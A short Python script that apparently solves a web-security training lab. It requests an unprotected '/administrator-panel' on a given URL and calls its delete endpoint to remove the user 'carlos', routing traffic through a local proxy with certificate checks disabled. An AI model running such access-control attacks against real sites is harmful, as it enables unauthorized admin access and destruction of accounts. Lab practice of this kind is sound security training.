import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def is_admin_panel_found(url):
    admin_panel_url = url + '/administrator-panel'
    response = requests.get(
        admin_panel_url,
        verify=False,
        proxies=proxies)
    return response.status_code == 200

def is_delete_carlos_successful(url):
    delete_carlos_url = (
        url + '/administrator-panel/delete?username=carlos')
    response = requests.get(
        delete_carlos_url,
        verify=False,
        proxies=proxies)
    return response.status_code == 200

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        print("[+] Starting Access Control attack...")
        if not is_admin_panel_found(url):
            print("[-] The administrator panel was not found.")
            sys.exit(FAIL)
        if not is_delete_carlos_successful(url):
            print("[-] Deleting carlos was not successful.")
            sys.exit(FAIL)
        print("[+] The Access Control attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Access Control attack was not successful.")
        sys.exit(FAIL) 